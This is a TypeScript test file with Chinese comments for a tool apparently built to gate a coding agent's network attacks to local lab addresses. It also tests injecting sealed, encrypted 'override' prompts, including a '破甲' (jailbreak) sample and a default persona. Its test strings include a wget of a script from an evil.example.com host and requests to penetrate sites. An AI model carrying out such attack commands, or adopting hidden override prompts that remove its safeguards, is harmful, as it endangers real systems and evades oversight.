/**
 * 冒烟单测：对照 dsh-purge 的纯算法行为。
 * Node 25 直接跑 .ts（类型剥离）。运行：node --test test/
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import {
  isLocalLabAddress,
  isAttackTask,
  isCheatTask,
  isBenignNetworkTopic,
  hostOf,
  hostsInText,
  toolCallText,
  publicHostHit,
  DENIAL,
} from "../src/gate/net-scope.ts";
import { resolveInjectText, defaultOverrideText } from "../src/inject/resolve.ts";
import { gateHandler } from "../src/gate/hooks.ts";
import { sealSlot, openSlot } from "../src/inject/crypto.ts";
import { resolveRole } from "../src/roles.ts";
import { DEFAULT_CONFIG } from "../src/config.ts";

test("isLocalLabAddress: loopback / RFC1918 放行", () => {
  assert.equal(isLocalLabAddress("127.0.0.1"), true);
  assert.equal(isLocalLabAddress("10.0.0.5"), true);
  assert.equal(isLocalLabAddress("192.168.1.10"), true);
  assert.equal(isLocalLabAddress("172.16.0.1"), true);
  assert.equal(isLocalLabAddress("172.31.255.254"), true);
  assert.equal(isLocalLabAddress("::1"), true);
});

test("publicHostHit: localhost / 本地 IP 不算公网目标", async () => {
  assert.equal(await publicHostHit("curl http://localhost:8080/x"), null);
  assert.equal(await publicHostHit("curl http://192.168.1.20/x"), null);
  const hit = await publicHostHit("curl http://8.8.8.8/x");
  assert.equal(hit?.label, "8.8.8.8");
  assert.equal(hit?.kind, "ip");
});

test("isLocalLabAddress: 公网地址拦截", () => {
  assert.equal(isLocalLabAddress("8.8.8.8"), false);
  assert.equal(isLocalLabAddress("172.32.0.1"), false);
  assert.equal(isLocalLabAddress("1.1.1.1"), false);
  assert.equal(isLocalLabAddress("2606:4700:4700::1111"), false);
});

test("hostOf 归一化（authority 形式，与上游一致）", () => {
  assert.equal(hostOf("Example.com:8080"), "example.com");
  assert.equal(hostOf("10.0.0.1:8080"), "10.0.0.1");
  assert.equal(hostOf("user@host.tld"), "host.tld");
  assert.equal(hostOf("[::1]:80"), "::1");
  assert.equal(hostOf("example.com."), "example.com");
});

test("hostsInText 抽取 host", () => {
  const hosts = hostsInText("curl http://10.0.0.1:8080/x && wget https://evil.example.com/a.js");
  assert.ok(hosts.has("10.0.0.1"));
  assert.ok(hosts.has("evil.example.com"));
});

test("isAttackTask / isCheatTask", () => {
  assert.equal(isAttackTask("帮我渗透 example.com 拿站"), true);
  assert.equal(isAttackTask("解释一下 DNS 解析原理"), false);
  assert.equal(isCheatTask("写个自瞄外挂"), true);
  assert.equal(isCheatTask("游戏里加个辅助函数"), false);
});

test("isBenignNetworkTopic: 代理/DNS 咨询不拦", () => {
  assert.equal(isBenignNetworkTopic("怎么配置 clash 代理"), true);
  assert.equal(isAttackTask("怎么用 clash 代理去打点攻击目标"), true);
});

test("toolCallText 从 tool_call 事件抽文本", () => {
  const text = toolCallText({ toolName: "bash", input: { command: "curl https://8.8.8.8/x" } });
  assert.ok(text.includes("8.8.8.8"));
  assert.ok(text.includes("bash"));
});

test("gateHandler: 公网目标 block + 拒绝语", async () => {
  const blocked = await gateHandler({ toolName: "bash", input: { command: "渗透 http://8.8.8.8 拿权限" } });
  assert.equal(blocked?.block, true);
  assert.equal(blocked?.reason, DENIAL);
});

test("gateHandler: 本地目标放行", async () => {
  const ok = await gateHandler({ toolName: "bash", input: { command: "curl http://127.0.0.1:8080" } });
  assert.equal(ok, undefined);
});

test("gateHandler: 非攻击任务不受影响", async () => {
  const ok = await gateHandler({ toolName: "read", input: { path: "src/a.ts" } });
  assert.equal(ok, undefined);
});

test("crypto: seal/open 往返", () => {
  const sealed = sealSlot("hello 破甲 world");
  assert.equal(openSlot(sealed), "hello 破甲 world");
  assert.equal(openSlot({ SLOT: "", MASK: "", TAG: "", IV: "" }), "");
});

test("resolveInjectText: 空项目回退默认槽", () => {
  const r = resolveInjectText("C:/nonexistent-project-xyz", "default", {});
  assert.equal(r.source, "default");
  assert.ok(r.text.length > 100);
  assert.ok(defaultOverrideText().includes("小码酱"));
});

test("resolveInjectText: rolePrompts 覆盖优先", () => {
  const r = resolveInjectText("C:/nonexistent-project-xyz", "plan", { plan: "PLAN ONLY" });
  assert.equal(r.source, "role");
  assert.equal(r.text, "PLAN ONLY");
});

test("resolveRole: modelRoles 映射", () => {
  const cfg = { ...DEFAULT_CONFIG, modelRoles: { plan: "gpt-5-plan" } };
  assert.equal(resolveRole({ model: { id: "gpt-5-plan" } }, cfg), "plan");
  assert.equal(resolveRole({ model: { id: "whatever" } }, cfg), "default");
});
